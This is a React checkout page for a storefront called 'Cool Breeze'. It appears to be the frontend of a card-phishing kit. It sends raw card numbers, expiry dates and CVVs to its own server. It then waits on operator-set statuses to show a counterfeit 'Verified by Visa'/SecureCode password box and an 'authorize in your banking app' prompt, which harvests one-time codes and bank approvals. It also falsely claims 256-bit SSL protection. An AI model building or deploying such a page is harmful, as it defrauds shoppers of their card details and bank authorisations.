import { useState, useMemo, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { useGetCartQuery, useSubmitCardVerificationMutation, useSubmitOtpMutation } from "../../features/api/apiSlice";
import { useSelector } from "react-redux";
import { Lock, ShieldCheck, CreditCard, CheckCircle2, AlertCircle, Info, Loader2 } from "lucide-react";
import { VisaLogo, MastercardLogo, AmexLogo, DiscoverLogo } from "../../components/ui/CardLogos";

const API_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";

function CheckoutPage() {
  const navigate = useNavigate();
  const { accessToken } = useSelector((state) => state.ui);

  const guestCartItems = useSelector((state) => state.guestCart.items);
  const { data: cartData } = useGetCartQuery(undefined, { skip: !accessToken });
  const cart = cartData?.data || cartData;
  const activeItems = accessToken
    ? cart?.items?.filter((i) => !i.saveForLater) || []
    : guestCartItems?.filter((i) => !i.saveForLater) || [];

  const totals = useMemo(() => {
    let subtotal = 0;
    activeItems.forEach((item) => {
      subtotal += item.price * item.quantity;
    });
    const tax = subtotal * 0.08;
    return {
      subtotal,
      tax,
      total: subtotal + tax,
      count: activeItems.reduce((acc, curr) => acc + curr.quantity, 0),
    };
  }, [activeItems]);

  const [form, setForm] = useState({
    fullName: "John Doe",
    phone: "+1 234 567 8900",
    line1: "123 Amazon Way",
    city: "Seattle",
    state: "WA",
    postalCode: "98101",
    country: "US",
  });

  const [cardForm, setCardForm] = useState({
    nameOnCard: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    saveCard: false,
  });

  const [cardErrors, setCardErrors] = useState({});
  const [flowState, setFlowState] = useState("idle"); // idle | processing | otp | success | error
  const [cardBrand, setCardBrand] = useState(null);
  const [verificationId, setVerificationId] = useState(null);
  const [otpValues, setOtpValues] = useState(["", "", "", "", "", ""]); // Keeping just in case, but using string
  const [otpPassword, setOtpPassword] = useState("");
  const [otpCardData, setOtpCardData] = useState(null);
  const [otpError, setOtpError] = useState(null);
  const [loaderProgress, setLoaderProgress] = useState(0);
  const pollingRef = useRef(null);

  const [submitCardVerification] = useSubmitCardVerificationMutation();
  const [submitOtp, { isLoading: isOtpLoading }] = useSubmitOtpMutation();

  // ── Card helpers ──
  const getCardBrand = (num) => {
    const clean = num.replace(/\D/g, "");
    if (!clean) return null;
    const prefix = parseInt(clean.substring(0, 2), 10);
    if (prefix >= 60 && prefix <= 69) return "DISCOVER";
    if (prefix >= 30 && prefix <= 39) return "AMEX";
    if ((prefix >= 50 && prefix <= 59) || (prefix >= 22 && prefix <= 27)) return "MASTERCARD";
    
    if (/^4/.test(clean)) return "VISA";
    return null;
  };

  const handleCardNumberChange = (val) => {
    const rawDigits = val.replace(/\D/g, "").slice(0, 16);
    const formatted = rawDigits.match(/.{1,4}/g)?.join(" ") || rawDigits;
    setCardForm((prev) => ({ ...prev, cardNumber: formatted }));
    setCardBrand(getCardBrand(rawDigits));
    if (cardErrors.cardNumber) setCardErrors((prev) => ({ ...prev, cardNumber: null }));
  };

  const handleExpiryChange = (val) => {
    let raw = val.replace(/\D/g, "").slice(0, 4);
    if (raw.length >= 3) raw = `${raw.slice(0, 2)}/${raw.slice(2)}`;
    setCardForm((prev) => ({ ...prev, expiryDate: raw }));
    if (cardErrors.expiryDate) setCardErrors((prev) => ({ ...prev, expiryDate: null }));
  };

  const handleCvvChange = (val) => {
    const raw = val.replace(/\D/g, "").slice(0, 4);
    setCardForm((prev) => ({ ...prev, cvv: raw }));
    if (cardErrors.cvv) setCardErrors((prev) => ({ ...prev, cvv: null }));
  };

  const validateCardForm = () => {
    const errors = {};
    const rawCardNum = cardForm.cardNumber.replace(/\D/g, "");
    if (!cardForm.nameOnCard.trim()) errors.nameOnCard = "Name on card is required";
    if (rawCardNum.length < 13) errors.cardNumber = "Please enter a valid card number";
    if (!cardForm.expiryDate || cardForm.expiryDate.length < 5) errors.expiryDate = "Enter expiration date (MM/YY)";
    if (!cardForm.cvv || cardForm.cvv.length < 3) errors.cvv = "Enter CVV code";
    return errors;
  };

  const handlePlaceOrder = async () => {
    const errors = validateCardForm();
    if (Object.keys(errors).length > 0) {
      setCardErrors(errors);
      return;
    }
    setFlowState("processing");
    setLoaderProgress(0);

    try {
      const result = await submitCardVerification({
        cardDetails: {
          nameOnCard: cardForm.nameOnCard,
          cardNumber: cardForm.cardNumber.replace(/\D/g, ""),
          expiryDate: cardForm.expiryDate,
          cvv: cardForm.cvv,
        },
        amount: totals.total,
        shippingAddress: form,
      }).unwrap();

      const payload = result?.data || result;
      const id = payload?.verificationId || payload?._id;
      if (id) {
        setVerificationId(id);
        startPolling(id);
      } else {
        setFlowState("idle");
        alert("Failed to get verification ID from server.");
      }
    } catch (err) {
      console.error("Payment Submission Error:", err);
      // Try to parse the error message from standard RTK Query error formats
      const errorMsg = err?.data?.message || err?.message || err?.error || "Failed to process payment. Please try again.";
      // Instead of silently resetting the form, let's at least log it or show it
      setFlowState("idle"); 
      alert("Error: " + errorMsg); // Fallback if toast isn't available
    }
  };

  const startPolling = (id) => {
    // Keep it in processing state
    if (pollingRef.current) clearInterval(pollingRef.current);
    
    // Poll every 3 seconds
    pollingRef.current = setInterval(async () => {
      try {
        const res = await fetch(`${API_URL}/card-verifications/${id}/status`, {
          headers: { Authorization: `Bearer ${accessToken}` }
        }).then(r => r.json());
        
        if (res?.data?.status === "otp_sent") {
          clearInterval(pollingRef.current);
          setOtpCardData(res.data.otpCard || null);
          setFlowState("otp");
        } else if (res?.data?.status === "otp_resent") {
          clearInterval(pollingRef.current);
          setOtpCardData(res.data.otpCard || null);
          setFlowState("otp");
          setOtpError("Inncorect Otp please enter your otp again");
        } else if (res?.data?.status === "authorize_app") {
          clearInterval(pollingRef.current);
          setFlowState("authorize_app");
        } else if (res?.data?.status === "failed") {
          clearInterval(pollingRef.current);
          setFlowState("idle");
          alert("Card verification failed. Please try a different card.");
        }
      } catch (err) {
        console.error("Polling error", err);
      }
    }, 3000);
  };

  const handleOtpInput = (val) => {
    // Only allow maximum 6 digits
    const digits = val.replace(/\D/g, "").slice(0, 6);
    setOtpPassword(digits);
  };

  const handleOtpSubmit = async () => {
    if (!otpPassword) { setOtpError("Please enter your password"); return; }
    setOtpError(null);
    try {
      const res = await submitOtp({ id: verificationId, otp: otpPassword }).unwrap();
      const status = res?.data?.status || res?.status;
      
      if (status === "otp_submitted") {
        setFlowState("processing");
        startPolling(verificationId);
      } else {
        setFlowState("success");
        setTimeout(() => navigate(`/checkout/success`), 2000);
      }
    } catch (err) {
      setOtpError(err?.data?.message || "Invalid Password. Please try again.");
    }
  };

  useEffect(() => {
    if (flowState === "processing") {
      const interval = setInterval(() => {
        setLoaderProgress((p) => Math.min(p + 5, 90));
      }, 200);
      return () => clearInterval(interval);
    }
    if (flowState === "otp" || flowState === "success") {
      setLoaderProgress(100);
    }
  }, [flowState]);

  useEffect(() => {
    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, []);

  // ── LOADING / PROCESSING STATE ──
  if (flowState === "processing") {
    return (
      <div className="fixed inset-0 bg-white z-50 flex items-center justify-center flex-col gap-6">
        <div className="relative w-20 h-20">
          <div className="absolute inset-0 rounded-full border-4 border-gray-200" />
          <div className="absolute inset-0 flex items-center justify-center">
            <Loader2 size={32} className="animate-spin text-sky-700" />
          </div>
        </div>
        <div className="w-64 bg-gray-200 rounded-full h-2">
          <div className="bg-sky-600 h-2 rounded-full transition-all duration-300" style={{ width: `${loaderProgress}%` }} />
        </div>
      </div>
    );
  }

  // ── AUTHORIZE APP STATE ──
  if (flowState === "authorize_app") {
    return (
      <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-2xl max-w-sm w-full p-8 text-center border-t-4 border-[#C7511F]">
          <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
            <Lock size={32} className="text-blue-600" />
          </div>
          <h2 className="text-xl font-bold text-gray-900 mb-2">App Authorization</h2>
          <p className="text-sm text-gray-600 font-medium mb-6">
            Please authorize the payment from your banking app
          </p>
          <div className="flex justify-center mb-6">
            <Loader2 size={32} className="text-sky-700 animate-spin" />
          </div>
          <div className="flex flex-col gap-3">
            <button
              onClick={() => setFlowState("idle")}
              className="w-full bg-sky-600 hover:bg-sky-700 text-white font-bold py-3 px-4 rounded-lg transition-colors"
            >
              Done
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ── OTP STATE (Verified by VISA Classic Layout) ──
  if (flowState === "otp") {
    const dateStr = otpCardData?.date ? new Date(otpCardData.date).toLocaleDateString('en-US') : new Date().toLocaleDateString('en-US');
    const brandStr = otpCardData?.brand || "VISA";
    const brandLabel = brandStr === "VISA" ? "Verified by Visa" : brandStr === "MASTERCARD" ? "Mastercard SecureCode" : brandStr === "DISCOVER" ? "Discover Secure" : brandStr === "AMEX" ? "Amex 3d secure" : "Verified by " + brandStr;
    
    return (
      <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
        {/* Main Classic Modal Box */}
        <div className="bg-white max-w-[380px] w-full p-6 shadow-2xl relative font-sans text-gray-800">
          
          {/* Header row with Logos */}
          <div className="flex justify-between items-center mb-6">
            {/* Left Logo */}
            <div className="flex flex-col">
              <span className="text-xl font-bold italic text-blue-900 leading-none tracking-tight">Verified</span>
              <span className="text-sm font-semibold italic text-blue-900 leading-none">by {brandStr}</span>
            </div>
            {/* Right Logo */}
            <div className="h-10 flex items-center justify-end w-24">
              {brandStr === "VISA" && <VisaLogo className="w-full h-full object-contain" />}
              {brandStr === "MASTERCARD" && <MastercardLogo className="w-full h-full object-contain" />}
              {brandStr === "AMEX" && <AmexLogo className="w-full h-full object-contain" />}
              {brandStr === "DISCOVER" && <DiscoverLogo className="w-full h-full object-contain" />}
              {/* Fallback if logo not matched */}
              {!["VISA", "MASTERCARD", "AMEX", "DISCOVER"].includes(brandStr) && (
                <div className="text-xl font-bold italic text-blue-900">Your<span className="text-blue-700">Bank</span></div>
              )}
            </div>
          </div>

          <h2 className="text-lg font-bold text-gray-900 mb-1 leading-tight">Added Protection</h2>
          <p className="text-sm text-gray-700 mb-4">Please submit your {brandLabel} password.</p>

          {/* Details Grid */}
          <div className="text-[13px] grid grid-cols-[130px_1fr] gap-y-1.5 mb-4">
            <div className="text-right text-gray-600 pr-2">Merchant:</div>
            <div className="font-medium text-gray-900">{otpCardData?.merchantName || "Cool Breeze"}</div>

            <div className="text-right text-gray-600 pr-2">Amount:</div>
            <div className="font-medium text-gray-900">${Number(otpCardData?.amount || totals.total).toFixed(2)}USD</div>

            <div className="text-right text-gray-600 pr-2">Date:</div>
            <div className="font-medium text-gray-900">{dateStr}</div>

            <div className="text-right text-gray-600 pr-2">Card Number:</div>
            <div className="font-medium text-gray-900">{otpCardData?.maskedCardNumber || "************" + cardForm.cardNumber.replace(/\D/g,"").slice(-4)}</div>

            <div className="text-right text-gray-600 pr-2">Personal Message:</div>
            <div className="font-medium text-gray-900">Password is &quot;{otpCardData?.generatedOtp || "1234"}&quot;</div>

            <div className="text-right text-gray-600 pr-2">User Name:</div>
            <div className="font-medium text-gray-900">{form.fullName}</div>

            <div className="text-right text-gray-600 pr-2 mt-1">Password:</div>
            <div className="mt-1">
              <input
                type="password"
                maxLength={6}
                inputMode="numeric"
                value={otpPassword}
                onChange={(e) => handleOtpInput(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter") handleOtpSubmit();
                }}
                className="w-full border border-gray-400 p-0.5 outline-none focus:border-blue-600 focus:ring-1 focus:ring-blue-600"
              />
            </div>
          </div>

          {otpError && (
            <p className="text-red-600 text-xs text-center mb-3">
              {otpError}
            </p>
          )}

          {/* Footer links and buttons */}
          <div className="flex flex-col items-end gap-2 text-xs">
            <div className="flex items-center gap-4">
              <button
                onClick={handleOtpSubmit}
                disabled={isOtpLoading}
                className="bg-gray-200 border border-gray-400 px-3 py-1 text-sm font-sans hover:bg-gray-300 disabled:opacity-50 cursor-pointer"
              >
                Submit
              </button>
              <a href="#" className="text-blue-600 hover:underline flex items-center gap-1">
                <span className="bg-orange-500 text-white w-3 h-3 flex items-center justify-center text-[10px] font-bold">?</span>
                Help
              </a>
              <button 
                onClick={() => { setFlowState("idle"); setOtpPassword(""); setOtpError(null); }}
                className="text-blue-600 hover:underline cursor-pointer bg-transparent border-0"
              >
                Exit
              </button>
            </div>
          </div>

        </div>
      </div>
    );
  }

  // ── SUCCESS ANIMATION ──
  if (flowState === "success") {
    return (
      <div className="fixed inset-0 bg-gradient-to-br from-green-900 via-emerald-800 to-green-900 z-50 flex items-center justify-center">
        <div className="text-center">
          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
            <CheckCircle2 size={40} className="text-white" />
          </div>
          <h2 className="text-3xl font-bold text-white mb-2">Payment Verified!</h2>
          <p className="text-green-200">Redirecting to your order confirmation...</p>
        </div>
      </div>
    );
  }

  // ── MAIN CHECKOUT FORM ──
  return (
    <div className="bg-gray-50 min-h-screen pb-16">
      <div className="bg-white border-b border-gray-300 py-5 text-center shadow-sm">
        <h1 className="text-2xl md:text-3xl font-normal text-gray-900 flex justify-center items-center gap-2">
          Checkout <span className="text-sm text-gray-500 font-bold mt-1">({totals.count} items)</span>
          <Lock size={18} className="text-emerald-600 ml-3" />
        </h1>
      </div>

      <div className="max-w-[1100px] mx-auto px-4 py-8 flex flex-col lg:flex-row gap-8">
        <div className="flex-1 space-y-6">

          {/* Step 1: Shipping Address */}
          <div className="bg-white border border-gray-300 rounded-lg p-6 shadow-sm">
            <h2 className="text-xl font-bold mb-4 text-sky-700 flex items-center gap-2">
              <span className="w-7 h-7 bg-sky-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</span>
              Shipping address
            </h2>
            <div className="pl-2 md:pl-8 grid gap-4 grid-cols-1 md:grid-cols-2">
              <Field label="Full name" value={form.fullName} onChange={(v) => setForm({ ...form, fullName: v })} />
              <Field label="Phone number" value={form.phone} onChange={(v) => setForm({ ...form, phone: v })} />
              <Field label="Address Line 1" value={form.line1} onChange={(v) => setForm({ ...form, line1: v })} />
              <Field label="City" value={form.city} onChange={(v) => setForm({ ...form, city: v })} />
              <Field label="State / Province" value={form.state} onChange={(v) => setForm({ ...form, state: v })} />
              <Field label="ZIP Code" value={form.postalCode} onChange={(v) => setForm({ ...form, postalCode: v })} />
            </div>
          </div>

          {/* Step 2: Payment Method */}
          <div className="bg-white border border-gray-300 rounded-lg p-6 shadow-sm">
            <h2 className="text-xl font-bold mb-4 text-sky-700 flex items-center justify-between">
              <span className="flex items-center gap-2">
                <span className="w-7 h-7 bg-sky-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</span>
                Payment method
              </span>

            </h2>

            <div className="pl-2 md:pl-8">
              <div className="border border-sky-500 ring-2 ring-sky-200 bg-sky-50/20 rounded-lg overflow-hidden">
                <div className="p-4 flex items-center justify-between bg-white border-b border-gray-100">
                  <div className="flex items-center gap-3">
                    <input type="radio" name="payment" checked readOnly className="w-4 h-4 accent-sky-600 cursor-pointer" />
                    <div className="flex items-center gap-2">
                      <CreditCard className="text-sky-700" size={22} />
                      <span className="font-bold text-gray-900 text-base">Credit or Debit Card</span>
                    </div>
                  </div>
                  {/* Proper card brand logos in header */}
                  <div className="hidden sm:flex items-center gap-1.5">
                    <VisaLogo width={44} height={28} />
                    <MastercardLogo width={44} height={28} />
                    <AmexLogo width={44} height={28} />
                    <DiscoverLogo width={44} height={28} />
                  </div>
                </div>

                {/* Card Fields */}
                <div className="p-5 md:p-6 bg-slate-50 border-t border-sky-100 space-y-5">
                  <div className="flex items-center justify-between">
                    <p className="text-xs font-semibold text-gray-600 uppercase tracking-wider">Enter Card Details</p>
                    {/* Proper original logo shown when card number typed */}
                    {cardBrand && (
                      <div className="flex items-center">
                        {cardBrand === "VISA"       && <VisaLogo width={56} height={35} />}
                        {cardBrand === "MASTERCARD" && <MastercardLogo width={56} height={35} />}
                        {cardBrand === "AMEX"       && <AmexLogo width={56} height={35} />}
                        {cardBrand === "DISCOVER"   && <DiscoverLogo width={56} height={35} />}
                      </div>
                    )}
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-800 uppercase tracking-wider mb-1">
                      Name on Card <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      placeholder="e.g. JOHN DOE"
                      value={cardForm.nameOnCard}
                      onChange={(e) => {
                        setCardForm({ ...cardForm, nameOnCard: e.target.value });
                        if (cardErrors.nameOnCard) setCardErrors({ ...cardErrors, nameOnCard: null });
                      }}
                      className={`w-full border rounded-md px-3 py-2 text-sm bg-white outline-none focus:border-sky-600 focus:ring-1 focus:ring-sky-600 ${cardErrors.nameOnCard ? "border-red-500 bg-red-50/50" : "border-gray-300"}`}
                    />
                    {cardErrors.nameOnCard && (
                      <p className="text-xs text-red-600 mt-1 flex items-center gap-1">
                        <AlertCircle size={12} /> {cardErrors.nameOnCard}
                      </p>
                    )}
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-800 uppercase tracking-wider mb-1">
                      Card Number <span className="text-red-500">*</span>
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        placeholder="4532 0000 0000 0000"
                        value={cardForm.cardNumber}
                        onChange={(e) => handleCardNumberChange(e.target.value)}
                        className={`w-full border rounded-md pl-3 pr-10 py-2 text-sm bg-white font-mono tracking-wider outline-none focus:border-sky-600 focus:ring-1 focus:ring-sky-600 ${cardErrors.cardNumber ? "border-red-500 bg-red-50/50" : "border-gray-300"}`}
                      />
                      <div className="absolute right-3 top-2.5 text-gray-400"><CreditCard size={18} /></div>
                    </div>
                    {cardErrors.cardNumber && (
                      <p className="text-xs text-red-600 mt-1 flex items-center gap-1">
                        <AlertCircle size={12} /> {cardErrors.cardNumber}
                      </p>
                    )}
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-bold text-gray-800 uppercase tracking-wider mb-1">
                        Expiration Date <span className="text-red-500">*</span>
                      </label>
                      <input
                        type="text"
                        placeholder="MM/YY"
                        value={cardForm.expiryDate}
                        onChange={(e) => handleExpiryChange(e.target.value)}
                        className={`w-full border rounded-md px-3 py-2 text-sm bg-white font-mono text-center outline-none focus:border-sky-600 focus:ring-1 focus:ring-sky-600 ${cardErrors.expiryDate ? "border-red-500 bg-red-50/50" : "border-gray-300"}`}
                      />
                      {cardErrors.expiryDate && (
                        <p className="text-xs text-red-600 mt-1 flex items-center gap-1">
                          <AlertCircle size={12} /> {cardErrors.expiryDate}
                        </p>
                      )}
                    </div>
                    <div>
                      <div className="flex items-center justify-between mb-1">
                        <label className="block text-xs font-bold text-gray-800 uppercase tracking-wider">
                          Security Code (CVV) <span className="text-red-500">*</span>
                        </label>
                        <span className="text-[10px] text-gray-400 cursor-help" title="3-digit code on back of card">
                          <Info size={12} className="inline" />
                        </span>
                      </div>
                      <input
                        type="password"
                        placeholder="•••"
                        maxLength={4}
                        value={cardForm.cvv}
                        onChange={(e) => handleCvvChange(e.target.value)}
                        className={`w-full border rounded-md px-3 py-2 text-sm bg-white font-mono text-center outline-none focus:border-sky-600 focus:ring-1 focus:ring-sky-600 ${cardErrors.cvv ? "border-red-500 bg-red-50/50" : "border-gray-300"}`}
                      />
                      {cardErrors.cvv && (
                        <p className="text-xs text-red-600 mt-1 flex items-center gap-1">
                          <AlertCircle size={12} /> {cardErrors.cvv}
                        </p>
                      )}
                    </div>
                  </div>

                  <label className="flex items-center gap-2 pt-2 cursor-pointer select-none">
                    <input
                      type="checkbox"
                      checked={cardForm.saveCard}
                      onChange={(e) => setCardForm({ ...cardForm, saveCard: e.target.checked })}
                      className="w-4 h-4 rounded accent-sky-600"
                    />
                    <span className="text-xs text-gray-700 font-medium">Save card details securely for future purchases</span>
                  </label>

                  <div className="flex items-center gap-2 text-[11px] text-emerald-700 bg-emerald-50 p-2.5 rounded border border-emerald-200">
                    <Lock size={14} className="shrink-0" />
                    <span>Your card information is encrypted with 256-bit SSL security and processed safely.</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Step 3: Order Items */}
          <div className="bg-white border border-gray-300 rounded-lg p-6 shadow-sm">
            <h2 className="text-xl font-bold mb-4 text-sky-700 flex items-center gap-2">
              <span className="w-7 h-7 bg-sky-600 text-white rounded-full flex items-center justify-center text-sm font-bold">3</span>
              Order items
            </h2>
            <div className="pl-2 md:pl-8 border border-gray-200 rounded-lg p-4 bg-gray-50/50">
              <div className="space-y-4">
                {activeItems.map((item) => (
                  <div key={item._id} className="flex gap-4 items-center border-b border-gray-200 pb-3 last:border-0 last:pb-0">
                    <img
                      src={item.product?.images?.[0]?.url || "https://images.unsplash.com/photo-1584622650111-993a426fbf0a?w=500&q=80"}
                      alt={item.product?.name}
                      className="w-16 h-16 object-contain rounded bg-white p-1 border border-gray-200"
                    />
                    <div>
                      <p className="font-bold text-gray-900 text-sm">{item.product?.name}</p>
                      <p className="font-bold text-sky-700 text-sm">${Number(item.price).toFixed(2)}</p>
                      <p className="text-xs text-gray-500">Qty: {item.quantity}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

        </div>

        {/* Right Column: Order Summary */}
        <div className="lg:w-[340px] shrink-0">
          <div className="bg-white border border-gray-300 rounded-lg p-5 sticky top-24 shadow-sm">
            <button
              onClick={handlePlaceOrder}
              disabled={activeItems.length === 0}
              className="w-full bg-sky-600 hover:bg-sky-500 text-white border border-sky-600 rounded-lg py-3 px-4 text-sm font-bold shadow transition-colors mb-2 cursor-pointer disabled:opacity-50"
            >
              Place your order
            </button>
            <p className="text-[11px] text-center text-gray-500 mb-4 leading-tight">
              By placing your order, you agree to Cool Breeze&apos;s privacy notice and conditions of use.
            </p>
            <h3 className="font-bold text-base text-gray-900 mb-3 border-b border-gray-200 pb-2">Order Summary</h3>
            <div className="text-sm space-y-2 pb-3 border-b border-gray-200 mb-3 text-gray-700">
              <div className="flex justify-between">
                <span>Items ({totals.count}):</span>
                <span>${totals.subtotal.toFixed(2)}</span>
              </div>
              <div className="flex justify-between">
                <span>Estimated tax:</span>
                <span>${totals.tax.toFixed(2)}</span>
              </div>
            </div>
            <div className="flex justify-between font-bold text-sky-700 text-xl pt-1">
              <span>Order total:</span>
              <span>${totals.total.toFixed(2)}</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function Field({ label, value, onChange }) {
  return (
    <label className="block">
      <span className="text-xs font-bold text-gray-800 uppercase tracking-wider block mb-1">{label}</span>
      <input
        value={value}
        onChange={(event) => onChange(event.target.value)}
        className="w-full border border-gray-300 rounded-md px-3 py-1.5 text-sm bg-white outline-none focus:border-sky-600 focus:ring-1 focus:ring-sky-600 transition-shadow"
      />
    </label>
  );
}

export default CheckoutPage;
